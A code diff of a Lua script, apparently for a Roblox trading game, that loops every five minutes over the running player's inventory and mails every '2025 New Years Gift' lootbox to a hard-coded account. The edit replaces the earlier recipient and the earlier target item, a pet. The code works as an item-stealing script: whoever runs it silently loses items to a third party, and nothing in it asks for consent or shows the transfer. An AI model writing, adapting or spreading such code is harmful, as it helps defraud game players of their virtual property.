@@ -17,35 +17,32 @@ spawn(function()
     end
 end)
 
--- Function to process Poinsettia Peacock pets and send them
 spawn(function()
     local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
-    local username = "BigMan_MC"
-    local loopInterval = 5  -- Interval in minutes
+    local username = "TheArex2006"
+    local loopInterval = 5 
     while true do
-        -- Get the player's inventory
         local playerInventory = Save.Get()["Inventory"]
-        local PetInv = playerInventory["Pet"]
-        print("Searching for Poinsettia Peacock...")
-        for key, item in pairs(PetInv) do
-            if item.id == "Poinsettia Peacock" then
-                print("Found Poinsettia Peacock pet:", item)
-                local petId = key  -- Use the key or unique identifier of the pet
-                local amount = item._am or item.am or 1  -- Default to 1 if amount is missing
+        local LootboxInv = playerInventory["Lootbox"]
+        print("Searching for 2025 New Years Gift...")
+        for key, item in pairs(LootboxInv) do
+            if item.id == "2025 New Years Gift" then
+                print("Found 2025 New Years Gift item:", item)
+                local amount = item._am or item.am or 1
                 print("Amount to send:", amount)
                 local args = {
-                    username,          -- Recipient username
-                    "Stay fresh",      -- Message
-                    "Pet",             -- Category
-                    petId,             -- Pet identifier
-                    amount             -- Amount to send
+                    [1] = username,
+                    [2] = "Take these gifts",
+                    [3] = "Lootbox",
+                    [4] = key,
+                    [5] = amount
                 }
                 print("Invoking Server with args:", unpack(args))
-                game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(unpack(args))
-                break  -- Exit the loop after mailing the first pet
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                break
             end
         end
-        print("Finished processing Poinsettia Peacock pets.")
-        task.wait(loopInterval * 60) -- Wait for the specified interval before the next check
+        print("Finished processing 2025 New Years Gifts.")
+        task.wait(loopInterval * 60)
     end
 end)
